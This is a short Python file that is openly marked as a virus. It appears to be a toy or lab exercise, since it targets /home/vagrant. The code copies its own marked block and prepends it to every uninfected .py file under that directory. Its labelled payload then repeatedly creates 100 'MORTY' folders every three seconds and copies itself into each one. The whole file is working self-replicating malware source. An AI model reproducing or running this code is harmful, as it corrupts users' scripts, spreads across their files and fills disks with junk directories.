### START OF VIRUS ###

import sys, glob 
import os, fnmatch
import threading

code = []
with open(sys.argv[0], 'r') as f:
 lines = f.readlines()

virus_area = False
for line in lines:
 if line == '### START OF VIRUS ###\n':
	virus_area = True
 if virus_area:
	code.append(line)
 if line == '### END OF VIRUS ###\n':
	break;


path = '/home/vagrant'

python_scripts = [os.path.join(dirpath, f)
for dirpath, dirnames, files in os.walk(path)
for f in fnmatch.filter(files, '*.py')]

print(python_scripts)

for script in python_scripts:
	with open(script, 'r') as f:
		script_code = f.readlines()

	infected = False
	for line in script_code:
		if line == '### START OF VIRUS ###\n':
			infected = True
			break

	if not infected:
		final_code = []
		final_code.extend(code)
		final_code.extend('\n')
		final_code.extend(script_code)

		with open(script, 'w') as f:
			f.writelines(final_code)

# malicious piece of code (payload)
name = str (sys.argv[0])
print (name)

def printit():
	threading.Timer(3.0, printit).start()
	for i in range (0, 100):
		directorio = "MORTY"+str(i)

		os.mkdir(directorio)
		os.system("copy"+" "+ name + " "+ directorio)
printit()

input()

### END OF VIRUS ###
